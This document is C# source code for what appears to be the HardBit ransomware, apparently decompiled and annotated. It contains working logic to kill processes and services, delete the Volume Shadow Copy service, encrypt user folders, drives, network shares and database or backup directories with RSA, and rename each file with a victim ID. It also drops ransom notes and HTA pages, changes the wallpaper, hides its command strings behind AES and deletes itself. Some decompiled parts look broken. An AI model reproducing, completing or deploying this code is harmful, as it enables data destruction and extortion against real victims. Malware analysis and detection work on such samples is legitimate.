using Microsoft.VisualBasic;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.DirectoryServices;
using System.IO;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;


namespace HardBit
{
  public sealed class Class01
  {
    private const string unk01 = "svch";
    private static Thread[] unk02;
    private object obj;
    private static string unk03 = "5pwqyNmu";
    private static string ransomExt2 = ".hardbit";
    private static bool needExportRSAKeys = true;
    private static string unk04 = "";
    private static string ransomExt = ".hardbit";
    private static string rsaPubKey = "";
    private static string rsaPrivKey = "";
    private static int numFiles = 0;
    private static bool extractRansomNote = true;
    public static RSACryptoServiceProvider rsaCryptoSvcProvider1 = new RSACryptoServiceProvider();
    public static RSACryptoServiceProvider rsaCryptoSvcProvider2 = new RSACryptoServiceProvider();
    public static List<string> unk05 = new List<string>();
    private const string unk06 = "|obPcjgaYHTYwLHddd|";
    public static string key_Victim = "";
    private static string userName = Environment.UserName;
    private static string usersFolder = "Users\\";
    private static string driveCRoot = "C:\\";
    private const string unk07 = "|TNhOiIZodsuLpbHuV|";
    public static string unk08;
    public static string ransomNote;
    public static string unk09;
    public static string email;
    public static string[] Xargs;
    public static string rsaKey = "";
    public static string id_Victim = Class01.GetUniqueKey(10);
    private Random rand;
    public const int SW_HIDE = 0;
    public const int SW_SHOW = 5;
    private static Queue<string> unk10 = new Queue<string>();

    public Class01()
    {
      this.obj = RuntimeHelpers.GetObjectValue(new object());
      this.rand = new Random();
    }

    [DllImport("user32.dll", EntryPoint = "SystemParametersInfo", CharSet = CharSet.Auto)]
    private static extern int MySystemParametersInfo(
      uint uiAction,
      uint uiParam,
      string pvParam,
      uint fWinIni);

    public static string GetUniqueKey(int maxSize)
    {
      char[] charArray = "70F64B87BOPN1XDSEAWSHO7030POGVC4DR5YGFFD6".ToCharArray();
      byte[] data = new byte[1];
      RNGCryptoServiceProvider rngCryptoSvcProvider = new RNGCryptoServiceProvider();
      try
      {
        rngCryptoSvcProvider.GetNonZeroBytes(data);
        data = new byte[checked (maxSize)];
        rngCryptoSvcProvider.GetNonZeroBytes(data);
      }
      finally
      {
        if (rngCryptoSvcProvider != null)
        {
          rngCryptoSvcProvider.Dispose();
        }
      }
      StringBuilder stringBuilder = new StringBuilder(maxSize);
      byte[] numArray = data;
      int index = 0;
      while (index < numArray.Length)
      {
        byte num = numArray[index];
        stringBuilder.Append(charArray[(int) num % charArray.Length]);
        checked { index += 1; }
      }
      return stringBuilder.ToString();
    }

    [STAThread]
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void Main(string[] args)
    {
      try
      {
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary,
                            OpenAccess.Read, OpenShare.Default, -1);
        string Expression = Strings.Space(checked ((int) FileSystem.LOF(1)));
        FileSystem.FileGet(1, ref Expression, -1, false);
        int[] numArray = new int[1];
        numArray[0] = 1;
        FileSystem.FileClose(numArray);
        string[] strArray = Strings.Split(Expression, "|TNhOiIZodsuLpbHuV|",
                                          -1, CompareMethod.Binary);
        Class01.rsaKey = strArray[1];
        Class01.ransomNote = strArray[2];
        Class01.email = strArray[3];

        Class03.kill_processes1();
        Class03.kill_services();
        Class03.kill_processes2();

        Class01.ExportRSAKeys();
        Class01.rsaCryptoSvcProvider1.FromXmlString(Class01.rsaKey);
        Class01.rsaCryptoSvcProvider2.FromXmlString(Class01.rsaPubKey);
        Class01.EncryptRSAPrivKey();

        Class01.KillVSS();

        Class01.Encrypt();

        Process.Start("How To Restore Your Files.txt");

        Class01.KillMe();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void HTA()
    {
      File.WriteAllText(Path.Combine(Path.GetTempPath(), "Help_me_Decrypt.hta"), <HTA.BIN>);
      Process.Start(Path.Combine(Path.GetTempPath(), "Help_me_Decrypt.hta"));
      File.WriteAllText(Path.Combine(Path.GetTempPath(), "Help_me_Decrypt.hta"), <HTA.BIN>);
      Process.Start(Path.Combine(Path.GetTempPath(), "Help_me_Decrypt.hta"));
      File.WriteAllText(Path.Combine(Path.GetTempPath(), "Help_me_Decrypt.hta"), <HTA.BIN>);
      Process.Start(Path.Combine(Path.GetTempPath(), "Help_me_Decrypt.hta"));
      File.WriteAllText(Path.Combine(Path.GetTempPath(), "Help_me_Decrypt.hta"), <HTA.BIN>);
      Process.Start(Path.Combine(Path.GetTempPath(), "Help_me_Decrypt.hta"));
      File.WriteAllText(Path.Combine(Path.GetTempPath(), "Help_me_Decrypt.hta"), <HTA.BIN>);
      Process.Start(Path.Combine(Path.GetTempPath(), "Help_me_Decrypt.hta"));
    }

    public static void SetWallpaper(string base64)
    {
      if (base64 == "")
        return;
      try
      {
        string str = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) +
                                               "\\HARDBIT.jpg";
        File.WriteAllBytes(str, Convert.FromBase64String(base64));
        Class01.MySystemParametersInfo((uint) 20, (uint) 0, str, (uint) 3);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void EncryptShares()
    {
      try
      {
        string domainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;
        DirectoryEntry directoryEntry = new DirectoryEntry("WinNT://" + domainName);
        directoryEntry.Children.SchemaFilter.Add("computer");
        try
        {
          foreach (DirectoryEntry child in directoryEntry.Children)
            Class01.EncryptPath(child.Name);
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void KillMe() => Process.Start(new ProcessStartInfo()
    {
      // "/C timeout 2 && Del /Q /F " + Application.ExecutablePath
      Arguments = Class01.decrypt_str("rgnMVay+1pDPIPHfvwWgsulAMKIo79HwN3RNklzqS0Q=").ToString() + Application.ExecutablePath,
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      // "cmd.exe"
      FileName = Class01.decrypt_str("g05sk9SOUvZMkrcHJlLl9w==").ToString()
    });

    private static object decrypt_str(string s)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };

      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("cuQJAseNrnVgajqlmcYGMUP", salt);
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
      MemoryStream memoryStream = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), (CryptoStreamMode) 1);
      object obj;
      try
      {
        byte[] buffer = Convert.FromBase64String(s);
        cryptoStream.Write(buffer, 0, buffer.Length);
        cryptoStream.Close();
        obj = (object) Encoding.UTF8.GetString(memoryStream.ToArray());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static void Encrypt()
    {
      Class01.StartEncrypt();
      Class01.EncryptSpecFolders();
    }

    public static void StartEncrypt()
    {
      new Thread(new ThreadStart(Class02.EncryptDrives)).Start();
      new Thread(new ThreadStart(Class01.EncryptShares)).Start();
    }

    public static void EncryptSpecFolders()
    {
      new Thread(new ThreadStart(Class01.EncryptLinksFolder)).Start();
      new Thread(new ThreadStart(Class01.EncryptContactsFolder)).Start();
      new Thread(new ThreadStart(Class01.EncryptDocsFolder)).Start();
      new Thread(new ThreadStart(Class01.EncryptDownloadsFolder)).Start();
      new Thread(new ThreadStart(Class01.EncryptPicturesFolder)).Start();
      new Thread(new ThreadStart(Class01.EncryptMusicFolder)).Start();
      new Thread(new ThreadStart(Class01.EncryptOneDriveFolder)).Start();
      new Thread(new ThreadStart(Class01.EncryptSavedGamesFolder)).Start();
      new Thread(new ThreadStart(Class01.EncryptFavoritesFolder)).Start();
      new Thread(new ThreadStart(Class01.EncryptSearchesFolder)).Start();
      new Thread(new ThreadStart(Class01.EncryptVideosFolder)).Start();
      new Thread(new ThreadStart(Class01.EncryptDesktopFolder)).Start();
    }

    public static void EncryptDesktopFolder() => Class01.EncryptPath(Class01.driveCRoot + Class01.usersFolder + Class01.userName + "\\Desktop");

    public static void EncryptLinksFolder() => Class01.EncryptPath(Class01.driveCRoot + Class01.usersFolder + Class01.userName + "\\Links");

    public static void EncryptContactsFolder() => Class01.EncryptPath(Class01.driveCRoot + Class01.usersFolder + Class01.userName + "\\Contacts");

    public static void EncryptDocsFolder() => Class01.EncryptPath(Class01.driveCRoot + Class01.usersFolder + Class01.userName + "\\Documents");

    public static void EncryptDownloadsFolder() => Class01.EncryptPath(Class01.driveCRoot + Class01.usersFolder + Class01.userName + "\\Downloads");

    public static void EncryptPicturesFolder() => Class01.EncryptPath(Class01.driveCRoot + Class01.usersFolder + Class01.userName + "\\Pictures");

    public static void EncryptMusicFolder() => Class01.EncryptPath(Class01.driveCRoot + Class01.usersFolder + Class01.userName + "\\Music");

    public static void EncryptOneDriveFolder() => Class01.EncryptPath(Class01.driveCRoot + Class01.usersFolder + Class01.userName + "\\OneDrive");

    public static void EncryptSavedGamesFolder() => Class01.EncryptPath(Class01.driveCRoot + Class01.usersFolder + Class01.userName + "\\Saved Games");

    public static void EncryptFavoritesFolder() => Class01.EncryptPath(Class01.driveCRoot + Class01.usersFolder + Class01.userName + "\\Favorites");

    public static void EncryptSearchesFolder() => Class01.EncryptPath(Class01.driveCRoot + Class01.usersFolder + Class01.userName + "\\Searches");

    public static void EncryptVideosFolder() => Class01.EncryptPath(Class01.driveCRoot + Class01.usersFolder + Class01.userName + "\\Videos");

    public bool ShowWindow(IntPtr hWnd, int nCmdShow)
    {
      bool flag;
      return flag;
    }

    public IntPtr GetConsoleWindow()
    {
      IntPtr consoleWindow;
      return consoleWindow;
    }

    private static bool c37b16090da21f48dfe520f2987d53a99()
    {
      bool flag;
      try
      {
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string path = folderPath + "\\pp\\RunAsAdmin.gk";
        if (!Directory.Exists(folderPath + "\\pp"))
        {
          Directory.CreateDirectory(folderPath + "\\pp");
          File.WriteAllText(path, "0");
          flag = true;
        }
        else if (File.ReadAllText(path) == "0")
        {
          File.WriteAllText(path, "1");
          flag = true;
        }
        else
          flag = false;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = true;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    private static void KillVSS()
    {
      try
      {
        Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/C sc delete VSS")
        {
          WindowStyle = ProcessWindowStyle.Hidden,
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true
        });
        process.StandardOutput.ReadToEnd();
        process.WaitForExit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void ExportRSAKeys()
    {
      Class01.rsaPubKey = Class01.rsaCryptoSvcProvider2.ToXmlString(false);
      Class01.rsaPrivKey = Class01.rsaCryptoSvcProvider2.ToXmlString(true);
    }

    public static string GetRndStr8()
    {
      string str = "";
      Random random = new Random();
      while (str.Length < 8)
      {
        char c = Strings.ChrW(random.Next(33, 125));
        if (char.IsLetterOrDigit(c))
        {
          str += c.ToString();
        }
      }
      return str;
    }

    public static int CheckProcess()
    {
      int num = 0;
      Process[] processes = Process.GetProcesses();
      int index = 0;
      while (index < processes.Length)
      {
        if (processes[index].ProcessName.ToLower().Contains("VGSPWRbBP"))
        {
          checked { num += 1; }
        }
        checked { index += 1; }
      }
      return num;
    }

    private static void EncryptRSAPrivKey()
    {
      List<byte[]> chunks = new List<byte[]>();
      byte[] keyData = Encoding.Default.GetBytes(Class01.rsaPrivKey);
      int numChunks = Convert.ToInt32(Math.Ceiling((double) keyData.Length / 117.0));
      int index1 = 0;
      int num1 = checked (numChunks - 1);
      int num2 = 0;
      while (num2 <= num1)
      {
        byte[] chunk = new byte[117];
        int index2 = 0;
        do
        {
          if (keyData.Length > index1)
          {
            chunk[index2] = keyData[index1];
            checked { index1 += 1; }
          }
          checked { index2 += 1; }
        }
        while (index2 <= 116);
        chunks.Add(chunk);
        checked { num2 += 1; }
        continue;
      }
      string s = "";
      try
      {
        foreach (byte[] chunk in chunks)
        {
          byte[] encChunk = Class01.rsaCryptoSvcProvider1.Encrypt(chunk, false);
          s += Encoding.Default.GetString(encChunk);
        }
      }
      finally
      {
        List<byte[]>.Enumerator enumerator;
        enumerator.Dispose();
      }
      string base64String = Convert.ToBase64String(Encoding.Default.GetBytes(s));
      Class01.key_Victim = base64String;
      string s = base64String + "\n" + Class01.rsaPubKey;
      if (Class01.CheckVictimKey())
      {
        Class01.null_func01(s);
        Class01.needExportRSAKeys = false;
      }
    }

    private static bool CheckVictimKey()
    {
      byte[] numArray = Convert.FromBase64String(Class01.key_Victim);
      if (numArray.Length != 1024)
      {
        Console.WriteLine(Operators.ConcatenateObject("BAD LENGTH: ", (object) numArray.Length));
        Class01.ExportRSAKeys();
        return false;
      }
      else
      {
        Console.WriteLine(RuntimeHelpers.GetObjectValue("SUCCESS: 1024"));
        Class01.needExportRSAKeys = false;
        return true;
      }
    }

    private static void null_func01(string s)
    {
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void EncryptPath(string Path)
    {
      try
      {
        RSACryptoServiceProvider rsaCryptoSvcProvider = new RSACryptoServiceProvider();
        rsaCryptoSvcProvider.FromXmlString(Class01.rsaPubKey);
        string[] files = Directory.GetFiles(Path);
        DirectoryInfo directoryInfo1 = new DirectoryInfo(Path);
        Path.LastIndexOf("\\");
        if (!directoryInfo1.Exists)
          throw new DirectoryNotFoundException("Source directory does not exist: " + directoryInfo1.FullName);
        string[] strArray = files;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          Class01.EncryptFile(strArray[index1], rsaCryptoSvcProvider);
          checked { index1 += 1; }
        }
        DirectoryInfo[] directories = directoryInfo1.GetDirectories();
        int index2 = 0;
        while (index2 < directories.Length)
        {
          DirectoryInfo directoryInfo2 = directories[index2];
          Class01.EncryptPath(directoryInfo2.FullName);
          Class01.ExtractRansomNote(directoryInfo2.FullName);
          Class01.HTA(directoryInfo2.FullName);
          checked { index2 += 1; }
        }
        return;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void EncryptDriveC()
    {
      try
      {
        Class01.EncryptDir("c:\\");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void EncryptDir(string dirPath)
    {
      string[] directories = Directory.GetDirectories(dirPath);
      int num1 = checked (directories.Length - 1);
      int index = 0;
      while (index <= num1)
      {
        if (!directories[index].Contains("Windows") &&
            !directories[index].Contains("Program Files") &&
            !directories[index].Contains("ProgramData")  &&
            !directories[index].Contains("Temporary Internet Files") &&
            !directories[index].Contains("PerfLogs"))
        {
          Class01.EncryptPath(directories[index]);
        }
        checked { index += 1; }
      }
    }

    public static void ExtractRansomNote(string dirPath)
    {
      string[] strArray1 = new string[1];
      int index = 0;
      string[] strArray2 = new string[5];
      strArray2[0] = Class01.ransomNote;
      strArray2[1] = "\r\n\r\nYour ID :";
      strArray2[2] = Class01.id_Victim;
      strArray2[3] = "\r\n\r\nYour Key : ";
      strArray2[4] = Class01.key_Victim;
      string str = string.Concat(strArray2);
      strArray1[index] = str;
      string[] contents = strArray1;
      try
      {
        File.WriteAllLines(dirPath + "\\How To Restore Your Files.txt", contents);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void HTA(string dirPath)
    {
      string[] strArray = new string[1];
      strArray[0] = <HTA.BIN>;
      string[] contents = strArray;
      try
      {
        File.WriteAllLines(dirPath + "\\Help_me_for_Decrypt.hta", contents);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static string ExecShellCmd(string cmd)
    {
      string end;
      try
      {
        end = Process.Start(new ProcessStartInfo("cmd.exe", "/C " + cmd)
        {
          WindowStyle = ProcessWindowStyle.Hidden,
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true
        }).StandardOutput.ReadToEnd();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        end = "Exception";
        ProjectData.ClearProjectError();
      }
      return end;
    }

    private static void EncryptFile2(
      string fileName,
      RSACryptoServiceProvider rsaCryptoSvcProvider)
    {
      try
      {
        Class01.EncryptFile(fileName, rsaCryptoSvcProvider);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Class01.EncryptFile2(fileName, rsaCryptoSvcProvider);
        ProjectData.ClearProjectError();
      }
    }

    private static void EncryptDBDirs(string dirPath)
    {
      try
      {
        string[] strArray1 = new string[5];
        strArray1[0] = "mysql";
        strArray1[1] = "firebird";
        strArray1[2] = " mssql";
        strArray1[3] = "microsoft sql";
        strArray1[4] = "backup";
        string[] strArray2 = strArray1;
        string[] strArray3 = strArray2;
        int index1 = 0;
        while (index1 < strArray3.Length)
        {
          string str = strArray3[index1];
          if (Path.GetDirectoryName(dirPath).Contains(str))
          {
            Class01.EncryptPath2(dirPath);
          }
          checked { index1 += 1; }
        }
        string[] directories = Directory.GetDirectories(dirPath);
        int index2 = 0;
        while (index2 < directories.Length)
        {
          string str1 = directories[index2];
          string[] strArray4 = strArray2;
          int index3 = 0;
          while (index3 < strArray4.Length)
          {
            string str2 = strArray4[index3];
            if (Path.GetDirectoryName(str1).Contains(str2))
            {
              Class01.EncryptPath2(str1);
            }
            checked { index3 += 1; }
          }
          Class01.EncryptDBDirs(str1);
          checked { index2 += 1; }
          continue;
        }
        return;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void EncryptPath2(string path)
    {
      RSACryptoServiceProvider rsaCryptoSvcProvider = new RSACryptoServiceProvider();
      rsaCryptoSvcProvider.FromXmlString(Class01.rsaPubKey);
      List<string> fileList = new List<string>();
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
      try
      {
        fileList.AddRange((IEnumerable<string>) Directory.GetFiles(path, "*.*", SearchOption.TopDirectoryOnly));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        foreach (string fileName in fileList)
        {
          checked { Class01.numFiles += 1; }
          Class01.EncryptFile(fileName, rsaCryptoSvcProvider);
        }
      }
      finally
      {
        List<string>.Enumerator enumerator;
        enumerator.Dispose();
      }
      try
      {
        if (Class01.extractRansomNote)
        {
          Class01.ExtractRansomNote(path);
          Class01.HTA(path);
        }
        string[] directories = Directory.GetDirectories(path);
        int index = 0;
        while (index < directories.Length)
        {
          string str = directories[index];
          if (!str.ToLower().Contains("windows") &&
              !str.ToLower().Contains("firefox") &&
              !str.ToLower().Contains("chrome") &&
              !str.ToLower().Contains("google") &&
              !str.ToLower().Contains("opera") &&
              (str != Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\VGSPWRbBP") &&
              ((uint)Operators.CompareString(str, folderPath, false) > (uint) 0))
          {
            Class01.EncryptPath2(str);
          }
          checked { index += 1; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void EncryptFile(
      string fileName,
      RSACryptoServiceProvider rsaCryptoSvcProvider)
    {
      try
      {
        FileInfo fileInfo = new FileInfo(fileName);
        if ((fileInfo.Extension == Class01.ransomExt) ||
            (fileInfo.Name == "Help_me_Decrypt.hta") ||
            fileInfo.FullName.Contains("How To Restore Your Files.txt") ||
            (fileInfo.Extension == ".Garyk") ||
            (fileInfo.Extension == ".dll") ||
            (fileInfo.Extension == ".exe") ||
            (fileInfo.Extension == ".EXE") ||
            (fileInfo.Extension == ".Bin") ||
            (fileInfo.Extension == ".lnk") ||
            (fileInfo.Extension == ".ini"))
          return;
        List<byte[]> chunks = new List<byte[]>();
        List<byte> encChunks = new List<byte>();
        if (fileInfo.Length / (long) 1024 > (long) 64)
        {
          chunks = Class01.ReadFileChunks(fileName, 547);
        }
        else
        {
          int numChunks = Convert.ToInt32(fileInfo.Length / (long) 117);
          if (fileInfo.Length < (long) 117)
          {
            chunks.Add(File.ReadAllBytes(fileName));
            using (FileStream fileStream = File.OpenWrite(fileName))
              fileStream.SetLength((long) 0);
          }
          else
            chunks = Class01.ReadFileChunks(fileName, numChunks);
        }
        if (chunks != null)
        {
          try
          {
            foreach (byte[] chunk in chunks)
            {
              byte[] encChunk = rsaCryptoSvcProvider.Encrypt(chunk, false);
              encChunks.AddRange((IEnumerable<byte>) encChunk);
            }
          }
          finally
          {
            List<byte[]>.Enumerator enumerator;
            enumerator.Dispose();
          }
          File.AppendAllText(fileName,
                             "<hardbit>" +
                             Convert.ToBase64String(encChunks.ToArray()) +
                             "</hardbit>",
                             Encoding.Default);
          string sourceFileName = fileName;
          string destFileName = fileName +
                                ".[id-" + Class01.id_Victim + "].[" +
                                Class01.email + "]" + Class01.ransomExt;
          File.Move(sourceFileName, destFileName);
          File.Delete(fileName);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static List<byte[]> ReadFileChunks(
      string fileName,
      int numChunks)
    {
      List<byte[]> chunks;
      try
      {
        int size = checked (numChunks * 117);
        List<byte[]> chunks2 = new List<byte[]>();
        byte[] array = new byte[checked (size)];
        FileStream fileStream1 = File.OpenRead(fileName);
        try
        {
          fileStream1.Seek((long) checked (-size), SeekOrigin.End);
          fileStream1.Read(array, 0, size);
        }
        finally
        {
          if (fileStream1 != null)
          {
            fileStream1.Dispose();
          }
        }
        FileStream fileStream2 = File.OpenWrite(fileName);
        try
        {
          fileStream2.SetLength(checked (fileStream2.Length - (long) size));
        }
        finally
        {
          if (fileStream2 != null)
          {
            fileStream2.Dispose();
          }
        }
        int index1 = 0;
        int num1 = checked (numChunks - 1);
        int num2 = 0;
        while (num2 <= num1)
        {
          byte[] numArray = new byte[117];
          int index2 = 0;
          do
          {
            numArray[index2] = array[index1];
            checked { index1 += 1; }
            checked { index2 += 1; }
          }
          while (index2 <= 116);
          chunks2.Add(numArray);
          checked { num2 += 1; }
          continue;
        }
        chunks = chunks2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        chunks = (List<byte[]>) null;
        ProjectData.ClearProjectError();
      }
      return chunks;
    }

    public static string GetRndStr(int strLen)
    {
      char[] charArray = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".ToCharArray();
      byte[] data = new byte[1];
      RNGCryptoServiceProvider rngCryptoSvcProvider = new RNGCryptoServiceProvider();
      try
      {
        rngCryptoSvcProvider.GetNonZeroBytes(data);
        data = new byte[checked (strLen)];
        rngCryptoSvcProvider.GetNonZeroBytes(data);
      }
      finally
      {
        if (rngCryptoSvcProvider != null)
        {
          rngCryptoSvcProvider.Dispose();
        }
      }
      StringBuilder stringBuilder = new StringBuilder(strLen);
      byte[] numArray = data;
      int index = 0;
      while (index < numArray.Length)
      {
        byte num = numArray[index];
        stringBuilder.Append(charArray[(int) num % charArray.Length]);
        checked { index += 1; }
      }
      return stringBuilder.ToString();
    }
  }
}
